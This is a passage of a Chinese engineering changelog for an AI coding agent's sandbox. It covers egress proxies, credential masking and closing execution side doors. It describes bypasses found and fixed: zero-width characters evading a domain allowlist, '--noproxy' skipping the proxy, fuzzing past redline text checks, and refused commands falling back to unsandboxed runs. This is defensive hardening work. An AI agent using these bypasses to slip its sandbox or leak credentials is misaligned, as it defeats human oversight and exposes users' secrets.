| `sandbox/egress_proxy.py` | **真实可运行**的 stdlib 本地回环代理：`CONNECT` 按 claim 校验主机（声明外 403、允许则建隧道）；明文 HTTP 绝对 URI 同样校验，转发时 `CredentialBroker.inject_headers()` 把 sentinel 还原成真实值；`env_overrides` 注入 `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY`、清空 `NO_PROXY` |
| `core/sandbox_provider.py` | `SandboxProfile` 新增 `allowed_domains`。**如实**：bwrap/seatbelt 只有 network namespace / IP 级规则，没有域名级过滤，这是元数据 |
| `sandbox/manager.py` | claim 写进 `verdict.extra` → `SandboxProfile.allowed_domains`；local 分支 `try/finally` 管代理生命周期，超时/异常一定 `stop()` |
| `config/security_schema.py` | `sandbox.resource.egress_proxy_enabled` 校验，开启报**行为变更** warning |

**A′（本轮自己引入、自己抓回）**：初版 `normalize_domain` 用
`str.encode("idna")`，U+200B ZWSP 被静默丢弃，
`evil\u200b.example → evil.example` —— 插零宽字符的不同主机可能匹配上
白名单声明。已加 ASCII 约束 + 逐字符白名单，非 ASCII 一律 `None`；脏声明
记为 `invalid_values` 并 fail-closed。代价：不支持国际化域名。

**配置**：`sandbox.resource.egress_proxy_enabled` 默认 **false**（开启会
改写所有子进程代理环境变量，属行为变更）；只有显式开启 + `strict` 逐命令
声明才构造代理。claim 的裁决层强绑定始终生效，所以「关闭」不算安全降级。
**`deny_network_by_default` 仍 false，没翻**。

**矩阵（不靠改口径凑数）**：`aligned 45 → 46`、`partial 10 → 9`、
**gap 仍 26**（`network_strict_allowlist` 本来就是 partial 不是 gap）。
`fully_superior` 仍 false，`b_waves_done` 仍 `["B1"]`。

**如实边界**：
1. `credential_masking` **仍 partial**：明文 HTTP 的 sentinel 注入已真接线
   （真 socket 端到端验证，上游 `Authorization` 拿到真实值）；HTTPS 走
   CONNECT 隧道后代理看不到 header，无法注入。覆盖需 TLS 中间人 +
   本地 CA 信任，会显著扩大攻击面，本轮不做，不谎称完整对等。
2. bwrap / seatbelt 没有域名级过滤，`allowed_domains` 只是元数据。
3. `evaluate_claim` 的 `undetectable` 是**标记**不是证明：若命令显式
   `--noproxy` 绕过 `env_overrides`，强绑定失效。本地 CLI 固有限制。
4. `os_sandbox` 仍 gap、`block_writes_outside_wd` 仍 partial、未在本轮动。
5. 不是真机多平台验证；A 线 10 个 pending、分叉改动、第三方自适应
   红队仍未完成。标语引擎 / 净化层 / `mapping.py` / `tui.py` 逐字节未改。

验证：43 例新回归（含真 socket 代理端到端）+ 合并批次全绿；
`matrix.validate() == []`、`evidence.verify_evidence() == []`、
`verify_doc_numbers.py problems == []`。两条既有计数断言同步到新基线，
**不是放宽**（仍要求总和 99、逐项对应）。


---

## 29. 深度轮：所有执行分支共用一个出网/凭据出口（完整复现见 `CLAUDE_PARITY.md` §14）

**§13 纠偏**：上一轮标 `network_strict_allowlist` 为 aligned 时说得太满，
那套强绑定只接在 `_execute_backend` 的 **local 分支**。

### 实测缺口

| 分支 | EgressGuard | claim 检查 | 代理 env | `last_egress` |
|---|---|---|---|---|
| `local` | 有 | 有 | 有 | 有 |
| `landlock`/`docker`/`seatbelt`/`bwrap` | **无** | 只传元数据 | **无** | **无** |
| `jobobject` (`_run_syscall`) | **无** | **无** | **无** | **无** |

- `SandboxProfile.allowed_domains` 在整个 `sandbox_provider.py` 里**只出现
  1 次**（字段定义），**没有任何后端消费** → strict claim 在强后端完全失效。
- `_run_provider` 不传 `env`，走 `sanitize_env`（置空）而非 sentinel 链路。
- **最严重**：`run_syscall_sandboxed` **根本没有 `env` 参数**，所有
  `Popen` / `run_with_tree_kill` / `os.execvp` 继承父进程完整环境 ——
  Job Object / seccomp / fallback 路径真实密钥原样进子进程，连置空都没有。
  **安全等级最高的路径，凭据保护反而是零。**

### 修复

| 模块 | 作用 |
|---|---|
| `sandbox/egress_plan.py`（新） | `plan_egress()` 分支前统一裁决；`plan_is_consistent_with_verdict()` 防审计/执行撕裂 |
| `sandbox/manager.py` | 四条路径统一拿 `plan.env`、统一写 `last_egress`；`_run_provider`/`_run_syscall` 加 `env`；`_make_egress_proxy(plan)` 只认 `plan.wants_proxy` |
| `arch/platform.py` | 三个入口全加 `env`，透传 Job Object `Popen`、`os.execvpe`、`unshare -n`、Linux fallback `Popen`、其它平台 fallback；`env=None` 保持继承语义 |
| 配置三处 | 新键 `sandbox.resource.strict_claim_strong_backend`（`deny` 默认 / `metadata_only` 降级），schema 枚举阻断 + 降级 warning + `harden status` 待加固项 |

**契约**：任何后端都拿 EgressGuard 脱敏 env；真正逐命令声明
（`source=tool_args`）+ 强后端因无域名级过滤、回环代理在 netns/seatbelt
下不可达而**默认 fail-closed 拒绝**。`source` 本轮第一次真正决定行为 ——
全局白名单回落（`global_policy`）沿用既有文本层语义，既有部署不被打断。

### A′（自己引入、自己抓回）
1. 统一 `to_audit_dict()` 漏了 `allowed` 字段（B2 首轮既有可观测契约），
   `test_b2_boundaries` 直接 `KeyError` —— 闸门锁紧了监控却看不到
   `allowed=false`。批次 A 抓回，已补回。
2. `_run_provider` 改签名后，**3 条既有断言同步且全部改强**（要求真拿到
   脱敏 env），不是放宽。

### 矩阵：一个状态没动
`aligned 46 / partial 9 / gap 26`、`fully_superior=false`、
`b_waves_done=["B1"]`。catalog 两条 note 补了纠偏说明但 `status` /
`evidence` 结构不变，`matrix.validate()` 与 `evidence.verify_evidence()`
均空。新增回归把计数逐项钉死，**不许靠改口径凑数**。

### 如实边界
HTTPS CONNECT 隧道内 header 注入仍不可用（需 TLS MITM + 本地 CA，
`credential_masking` 仍 partial）；bwrap/seatbelt/seccomp 无域名级过滤，
`allowed_domains` 仍是元数据（立场是「做不到就拒绝」）；`metadata_only`
是真实降级，schema warning + harden status 明示；`undetectable` 是标记
不是证明；`os_sandbox` 仍 gap、`deny_network_by_default` 仍 false 未翻、
`block_writes_outside_wd` 仍 partial；不是真机多平台验证；
`test_platform_portability.py` 长批次多次 502/超时只跑到约 51% 且零失败，
**按未完整跑完如实报告**；`test_arch_security.py` 1 例失败上一轮
baseline control 已证是既有环境行为，没为变绿改策略；A 线 10 pending、
分叉改动、第三方自适应红队未做。标语引擎 / 净化层 / `mapping.py` /
`tui.py` 逐字节未改。

### 验证
`test_b2s_egress_uniform.py` + `test_b2_egress_strict.py` **80 passed**；
合并批次 A **341 passed**；逐文件 arch_platform 10 / arch_security_fixes 6 /
proc 5 / risk_sandbox 14 passed；`matrix.validate() == []`、
`evidence.verify_evidence() == []`、`verify_doc_numbers.py problems == []`。


---

## 30. 深度轮：终态拒绝不回落、内层不吃掉占位符（完整复现见 `CLAUDE_PARITY.md` §15）

**§13/§14 纠偏**：前两轮把强绑定逐层接好，但这轮发现**拒绝结果本身
没接好**，且内层又把占位符吃掉了。矩阵计数一个没动。

### 四个实测断点

| 编号 | 实测结果 |
|---|---|
| **R1** | `tools/shell.py::_route_sandbox_isolation` 只用 `verdict.enforced / backend_available` 判断是否采纳隔离结果；plan 拒绝结果**天然 `enforced=False`**，`enforce_required=false` 且无强后端时路由返回 `None` → `run_shell` 把**被拒命令在真实工作区裸跑一遍**。实测三种 verdict 配置之一确实回落 |
| **R2** | `copy_diff_apply` 在拒绝后仍走 `build_diff_preview → make_confirm_callable → confirm_apply`：副本其实是空的，`error` 变成「denied + 预览」把合规拒绝伪装成用户主动拒绝，还无条件 `verdict.enforced=True` 宣称已隔离执行，并弹确认卡片要用户确认写回没发生的变更 |
| **R3** | `SandboxProvider._sanitize_env` 按**键名**把 `OPENAI_API_KEY` 置空，把 `plan_egress` 注入的 `tuan-egress-sentinel-v1:<fp>` 也在接线内层抹成 `''` —— §14 验证的是**传给 provider.run 的参数**，不是子进程实际拿到的值。强后端拿不到可还原标记，`inject_headers()` 链路静默断裂 |
| **R4** | `SECRET_HINTS` 含 `"TUAN_"`，`TUAN_WORKSPACE` 被抹空；只有 `LocalSandbox` 补回，另外三个强后端此前都没补 |

**R3 如实说明**：当前默认配置下强后端 + 真正逐命令声明会被 §14 拒绝、
不启代理，所以该断裂**不产生已观测的实际危害**；修的是接线一致性，
防止未来放宽（如 `metadata_only` + host 网络代理）时静默失效，不夸大。

### 修复

| 位置 | 修复 |
|---|---|
| `sandbox/manager.py` | `SandboxExecResult` 新增 `terminal_refusal: bool = False`，把「终态安全拒绝」与「隔离是否生效」**解耦**；`_execute_backend` 在 `not plan.allowed` 时置 True；`_execute_copy_diff_apply` 检测到它立刻返回（不建 diff、不要确认、不设 `verdict.enforced=True`） |
| `tools/shell.py` | 路由**优先**检查 `res.terminal_refusal` → 无条件返回 `[错误] <拒绝原因>`，绝不回落；正常执行路径逻辑原样不动 |
| `core/security_utils.py` | 新增 `MASKED_PLACEHOLDER_PREFIX` / `is_masked_placeholder()`（共享原语层，避免 `core → sandbox` 反向循环导入）；**不改** `sanitize_env` 全局语义 |
| `core/sandbox_provider.py` | `_sanitize_env` 按**值**保留占位符（真实值仍按键名抹空）；四个后端统一以 `workspace` 参数为准补 `TUAN_WORKSPACE`，不信任外部 env 假路径 |

**关键**：两处必须配合 —— 先堵回落才能去掉 `verdict.enforced=True`，
否则「修语义谎言」会直接变成「放开裸跑」。`terminal_refusal` 是共享的
单一契约。

### A′（自己引入、自己抓回）
写注释时用了带 `\n` 的错误文案示例，Python 三引号字符串把它解释成真实
换行，写入源码后变成独立一行 `preview"),`，`py_compile` 直接
`SyntaxError`（manager.py:496）。改成不含反斜杠的文案后恢复。

### 四个「不该修」（都配可执行回归）
`last_egress` 并发撕裂未复现（双线程 × 200 次 0 撕裂，GIL 兜住，本轮
**不加锁**、不宣称线程安全）；`cmd_safe.py` 只查 `is_available()/.name`；
`orchestration.py` 只挂 `agent.ctx.sandbox_provider`、全仓无 `.run()` 调用点
（新增源码扫描回归，并标注未来若下游自己调 `ctx.sandbox_provider.run()`
会绕过整套 `plan_egress`）；全局 `sanitize_env` 行为不变。

### 矩阵：一个状态没动
`aligned 46 / partial 9 / gap 26`、`fully_superior=false`、
`b_waves_done=["B1"]`。catalog 两条 note 补第三轮纠偏说明但 `status` /
`evidence` 结构不变，`matrix.validate()` 与 `evidence.verify_evidence()`
均空。新增回归把计数逐项钉死，**不许靠改口径凑数**。

### 如实边界
HTTPS CONNECT 隧道内 header 注入仍不可用（`credential_masking` 仍 partial）；
bwrap/seatbelt/seccomp 无域名级过滤、`allowed_domains` 仍是元数据；
`last_egress` 仍非线程安全；`undetectable` 是标记不是证明；`os_sandbox`
仍 gap、`deny_network_by_default` 仍 false 未翻、
`block_writes_outside_wd` 仍 partial；不是真机多平台验证，
`test_platform_portability.py` 长批次上一轮只跑到约 51% 零失败、本轮
未重跑，如实沿用「未完整跑完」；`test_arch_security.py` 1 例失败上一轮
parent-blob baseline control 已证是既有环境行为，本轮复跑仍
1 failed/6 passed，没为变绿改策略；A 线 10 pending、分叉改动、
第三方自适应红队未做。标语引擎 / 净化层 / `mapping.py` / `tui.py`
逐字节未改。

### 验证（按分批报告）
本轮 + 上两轮 **106 passed**；shell 路由影响面 **99 passed**；
parity + 配置 + 安全回归 **170 passed**；sandbox/platform/proc 逐文件
合计 **91 passed**（批次间有重叠，不累加）；`matrix.validate() == []`、
`evidence.verify_evidence() == []`、`verify_doc_numbers.py problems == []`。


---

## 31. 深度轮：是否回落由结果自身决定（`decided` 单一契约）

完整复现见 `CLAUDE_PARITY.md` §16。**§13–§15 第四轮纠偏**：上一轮用
`terminal_refusal` 只堵了「plan 拒绝」一条分支，回落开关本身仍用错字段。
矩阵计数一个没动。

### G（最值钱）：降级部署里命令被双重执行

`tools/shell.py::_route_sandbox_isolation` 用
`verdict.enforced or verdict.backend_available` 判断是否采纳隔离结果，
但这两个是**裁决字段**（用没用上强后端），不是「`execute_isolated`
做没做事」。`enforce_required=false` 且无强后端时 local 分支**真实执行
了命令**，路由却返回 `None`，`run_shell` 再 `subprocess.Popen` 跑第二遍
—— 实测隔离层 1 次 + bare Popen 1 次，返回的是第二次的结果，隔离层的
脱敏 env / 出网裁决 / `last_egress` 全部白做。任何有副作用的命令执行
两次。**「隔离后端不可用」不等于「命令还没跑」**。

### 另外五个实测断点

| 编号 | 实测结果 |
|---|---|
| F1 | `_run_provider` 强后端抛异常 → 返回 `returncode=-1, enforced=False` → 同样回落裸跑 |
| F2 | `subprocess.TimeoutExpired` → 同样回落裸跑 |
| F3 | `copy_diff_apply` 的 `isolate_workdir` 抛异常 → 外层 `except` 返回 **`enforced=True` 宣称已隔离执行**（一个副本都没建），路由只看 `verdict.enforced`（仍 False）→ 同样回落；`res.enforced` 在路由里根本没被消费 |
| F4 | `build_diff_preview` 失败时 `error` 直接拼 `str(exc)`，实测 `GITHUB_TOKEN=ghp_REAL_SECRET_VALUE` **原样回显**；OSC 8 / RLO 也进终端 |
| F5 | `copy_diff_apply` 只拦 `terminal_refusal`；执行层超时 / 崩溃返回 `-1` 时仍走 diff → confirm，让用户确认写回一个根本没成功执行的副本 |

### 修复

| 位置 | 修复 |
|---|---|
| `sandbox/manager.py` | `SandboxExecResult` 新增 `decided: bool = True`（**默认 fail-closed**）；唯一 `decided=False` 是 `not verdict.isolate` 分支。所有 `except` / 超时 / diff 失败分支改用 `safe_error_text(str(exc))` 并显式 `decided=True`；`copy_diff_apply` 对 `returncode < 0` 也立刻返回；外层异常如实 `enforced=False` |
| `tools/shell.py` | 路由不再看 `verdict.enforced / backend_available`，只问 `res.decided`；自身 `except` 同样净化且返回终态错误文本 |
| `core/security_utils.py` | 新增 `safe_error_text()`：非 str 只取类型名 → 剥离 Cc/Cf/bidi/OSC → 复用既有 `redact_sensitive()` 遮蔽密钥 → 限长 400；脏 `limit` 回落默认，绝不抛异常 |

**净化在来源处做，出口不二次净化**：用户主动拒绝写回时 `res.error`
含 diff 预览正文，用户必须能看见「本来要改什么」。新增源码级回归
锁住「出口不调 `safe_error_text(res.error)`」。`safe_error_text` 不做
grapheme 簇 / 显示宽度判定，不与标语轮 UI 净化层构成第三套宽度真值。

### A′（自己引入、自己抓回）
`test_no_second_sanitization_at_route_exit` 初版断言
`count("safe_error_text") == 1`，实测是 **2**（同一个 except 分支里
import + 调用）。断言改成「次数为 2 + 出口原样使用 `res.error` +
不出现 `safe_error_text(res.error`」。测试断言写错，不是代码缺陷。

### 三个「不该修」（都配可执行回归）
未终止 OSC 参数残留（ESC/BEL/RLO 已剥离，终端不会再解释）；全局
`redact_sensitive` 行为不变（避免影响审计日志 / MCP 审计 / 导出链路）；
`cmd_safe.py` / `orchestration.py` 仍不是执行侧门（沿用 §15 源码扫描）。

### 矩阵：一个状态没动
`aligned 46 / partial 9 / gap 26`、`fully_superior=false`、
`b_waves_done=["B1"]`。catalog 两条 note 补第四轮纠偏指向但 `status` /
`evidence` 结构不变，`matrix.validate()` 与 `evidence.verify_evidence()`
均空。新增回归把计数逐项钉死，**不许靠改口径凑数**。

### 如实边界
HTTPS CONNECT 隧道内 header 注入仍不可用（`credential_masking` 仍
partial）；bwrap/seatbelt/seccomp 无域名级过滤、`allowed_domains` 仍是
元数据；**`decided` 默认 True 是行为变更**，依赖旧回落语义的第三方
集成需核对；`safe_error_text` 只处理执行层异常消息，diff 预览正文仍
原样回显；`last_egress` 仍非线程安全；`undetectable` 是标记不是证明；
`os_sandbox` 仍 gap、`deny_network_by_default` 仍 false 未翻、
`block_writes_outside_wd` 仍 partial；不是真机多平台验证，
`test_platform_portability.py` 长批次 §14 轮只跑到约 51% 零失败、
本轮未重跑；`test_arch_security.py` 1 例失败已由 parent-blob baseline
control 证明是既有环境行为，没为变绿改策略；A 线 10 pending、分叉
改动、第三方自适应红队未做。标语引擎 / 净化层 / `mapping.py` /
`tui.py` 逐字节未改。

### 验证（按分批报告）
本轮 + 上三轮 + boundaries + claude_parity **227 passed**；shell 路由
影响面 **99 passed**；parity + 配置 + 安全回归 **170 passed**；
sandbox/platform/proc/e1e7 逐文件合计 **130 passed**（批次间有重叠，
不累加）；`matrix.validate() == []`、`evidence.verify_evidence() == []`、
`verify_doc_numbers.py problems == []`。


---

## 深度轮（续）：两条执行侧门收口 —— 后台 `! cmd` 与对外 MCP `run_shell`

> **章节编号纠偏**：本文件 §17 是「运行时闭环」，`CLAUDE_PARITY.md` §17
> 是「自愈/证据保全」，`SECURITY_EN.md` §17 是「Owner Normalization」，
> `SLOGAN_MAPPING.md` 另有一套 §17。上一轮后台分支代码注释引用的
> 「本轮 §17」实际指向不存在。本轮改用**自足标题**，代码注释同步改自足
> 描述，不做全局重编号。完整复现见 `CLAUDE_PARITY.md` 末尾。

两轮合并推送。**矩阵计数一个没动**：`aligned 46 / partial 9 / gap 26`、
`fully_superior=false`、`b_waves_done=["B1"]`。

### 实测缺口

| 位置 | 实测结果 |
|---|---|
| 后台 `! cmd` | `run_shell` 里 `is_bg_command` 分支在 `_pre_exec_guard` **和** `_route_sandbox_isolation` 之前就 return。带 `isolate=True` 裁决时隔离层调用 **0 次**、bare `Popen` **1 次**、返回「后台已启动」。`decided` 契约只管主链路路由返回值，覆盖不到这里 |
| 后台 env | `BackgroundShellManager.start` 的 Popen **不传 env**，子进程继承父进程完整环境，实测真实 `GITHUB_TOKEN` 原样进入不受出网管控的异步进程 |
| MCP M1 | `ecosystem/mcp_server.py::_h_run_shell` 是全仓唯一「外部 Agent 直接给 `command` + `shell=True`」入口，只做 `is_hard_redline`/`is_redline` **文本判定**，不经过四层滤网 / `plan_egress`。fuzz 已证零宽字符 / ANSI-C / 注释换行可绕过 |
| MCP M2 | `subprocess.run` 不传 env，实测 `GITHUB_TOKEN=ghp_REAL_SECRET_VALUE` 原样进子进程，与 §13/§15「子进程不持密钥」直接矛盾 |
| MCP M3 | `str(exc)` 原样回显给外部 Agent：真实密钥串、OSC 8 / RLO 外泄（执行失败 + 安全判定失败两处） |
| 全局 | 上一轮 `f"{type(exc).__name__}: {safe_error_text(str(exc))}"` 中 `str(exc)` 在**调用方**先执行；实测异常对象 `__str__` 抛错会掀翻整个 `except` 分支。`shell.py` 另有 5 处、`background_shell.py` 1 处、MCP 3 处裸 `{exc}` 回显 |

### 修复

| 位置 | 修复 |
|---|---|
| `core/security_utils.py` | 新增 `safe_exception_text(exc)`：`str(exc)` 包进 try，异常时丢弃原文只留类型名；正常时复用 `safe_error_text`。**全部 12 处**错误出口统一走它 |
| `tools/shell.py::_start_background` | 裁决 `isolate=True` → **fail-closed 拒绝**（异步路径套不上同步隔离执行器 / copy-diff-apply 确认，绝不假装隔离生效）；其余后台命令显式传 `sanitize_env()` 脱敏环境并补 `TUAN_WORKSPACE` |
| `core/background_shell.py` | `start` / `run_in_background` 增加 `env` 形参（`None` 保持继承语义向后兼容），Popen 透传；后台线程异常终态净化 |
| `ecosystem/mcp_server.py` | 接 `SandboxManager.assess_command`（DENY / CONFIRM / `isolate=True` 一律 fail-closed 拒绝）+ `plan_egress(verdict, "local", ...)`（`allowed=False` 拒绝，`plan.env` 脱敏值显式传给 `subprocess.run`）；所有异常出口净化；工具描述如实标注「没有 OS 级隔离 / 逐命令域名强绑定 / 副本确认」 |
| `sandbox/manager.py` | 5 处 `safe_error_text(str(exc))` → `safe_exception_text(exc)` |

**backend 固定 `local`**：MCP 本来就是同步裸 subprocess，绝不拿 verdict
里的强后端名假装已隔离。默认 `allow_dangerous_tools=false` 行为不变。

### 三个「不该修」（都配可执行回归）
`ignored` 死字段与 `decided` 不冲突（全仓零构造点，保留做兼容）；
`verdict.enforced` 全仓无消费点但**不删**（删除会改变 verdict 状态）；
`artifact_tool.py` / `code.py` 的 Popen 打开编辑器/文件、不执行用户
shell 命令，如实记录不动。

### A′ ×2
批量替换破坏两处多行 f-string 拼接 → `py_compile` SyntaxError，已改
字符串 `+` 拼接；上一轮测试用固定 2600 字符窗口切片，注释变长后把
except 分支挤出窗口，且实际代码是 `safe_exception_text` → 断言改用
`inspect.getsource`。两处都是测试/替换脆弱性，不是代码回归。

### 矩阵：一个状态没动
`status` / `evidence` 结构不变，catalog 两条 note 补第五/六轮纠偏指向，
`matrix.validate()` 与 `evidence.verify_evidence()` 均空。新增回归把计数
逐项钉死，**不靠改口径凑数**。

### 如实边界
**MCP 通道仍没有 OS 级隔离 / 域名强绑定 / 副本确认**，本轮做的是
fail-closed 拒绝 + 脱敏 env，**不是**把这些能力补上；`credential_masking`
仍 `partial`（HTTPS CONNECT 隧道内 header 不可见）。后台/MCP 都是
**行为变更**。`ctx` 无 `_sandbox_verdict` 时后台不拦（裁决链上游边界，
本轮不伪造裁决、不靠文本猜高危）。`safe_exception_text` 只覆盖异常
消息，diff 预览正文仍原样回显。`os_sandbox` 仍 gap、
`deny_network_by_default` 仍 false 未翻、`block_writes_outside_wd` 仍
partial。不是真机多平台验证；长批次多次 502/超时按分批如实报告、
不冒充全量单跑；`test_arch_security.py` 1 例失败已由 parent-blob
baseline control 证明是既有环境行为，没为变绿改策略。A 线 10 pending、
分叉改动、第三方自适应红队未做。标语引擎 / 净化层 / `mapping.py` /
`tui.py` 逐字节未改。

### 验证（按分批报告）
本轮 + 并行线 + 上四轮 **276 passed**；shell/后台影响面 **82 passed**；
parity + 配置 + 安全回归 **78 passed**；sandbox/platform/proc/e1e7
逐文件 **130 passed**（沿用 §16 分批结果）；`verify_doc_numbers.py
problems == []`。批次间有重叠，不累加。新增
`tests/test_b2se_background_side_door.py`（约 24 例）与
`tests/test_b2su_mcp_shell_gate.py`（约 25 例）。
